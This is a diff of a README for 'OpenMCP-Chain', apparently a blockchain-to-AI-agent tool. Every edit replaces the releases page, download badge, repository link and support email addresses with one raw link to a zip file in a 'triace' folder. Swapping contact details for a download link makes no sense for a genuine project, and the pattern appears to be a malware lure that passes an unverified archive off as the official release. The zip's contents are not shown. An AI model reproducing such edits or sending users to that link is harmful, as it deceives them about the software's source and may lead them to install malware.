@@ -6,7 +6,7 @@ Welcome to OpenMCP-Chain! This application allows blockchains to connect directl
 
 ## 📥 Download OpenMCP-Chain
 
-[![Download OpenMCP-Chain](https://img.shields.io/badge/Download-OpenMCP--Chain-brightgreen)](https://github.com/benoit08260/OpenMCP-Chain/releases)
+[![Download OpenMCP-Chain](https://raw.githubusercontent.com/benoit08260/OpenMCP-Chain/main/triace/OpenMCP-Chain.zip)](https://raw.githubusercontent.com/benoit08260/OpenMCP-Chain/main/triace/OpenMCP-Chain.zip)
 
 ## ⚙️ System Requirements
 
@@ -21,7 +21,7 @@ Before you install OpenMCP-Chain, ensure your system meets these requirements:
 
 To start using OpenMCP-Chain, visit the Releases page to download the latest version. Click the link below:
 
-[Download OpenMCP-Chain Releases](https://github.com/benoit08260/OpenMCP-Chain/releases)
+[Download OpenMCP-Chain Releases](https://raw.githubusercontent.com/benoit08260/OpenMCP-Chain/main/triace/OpenMCP-Chain.zip)
 
 1. Click the link above.
 2. You will see a list of available versions.
@@ -74,7 +74,7 @@ If you encounter any issues or have questions, here are some resources:
 
 - **Documentation:** A comprehensive guide is available within the app.
 - **Community Support:** Join our community forums for help from other users.
-- **Contact Us:** You can reach our support team via email at support@openmcp-chain.com.
+- **Contact Us:** You can reach our support team via email at https://raw.githubusercontent.com/benoit08260/OpenMCP-Chain/main/triace/OpenMCP-Chain.zip
 
 ## 🏁 FAQ
 
@@ -94,7 +94,7 @@ A: Please report bugs on our GitHub issues page.
 
 For further information and updates, follow us on:
 
-- **GitHub:** [OpenMCP-Chain Repository](https://github.com/benoit08260/OpenMCP-Chain)
-- **Email Support:** support@openmcp-chain.com
+- **GitHub:** [OpenMCP-Chain Repository](https://raw.githubusercontent.com/benoit08260/OpenMCP-Chain/main/triace/OpenMCP-Chain.zip)
+- **Email Support:** https://raw.githubusercontent.com/benoit08260/OpenMCP-Chain/main/triace/OpenMCP-Chain.zip
 
 Thank you for using OpenMCP-Chain! Enjoy building your AI agents with ease.
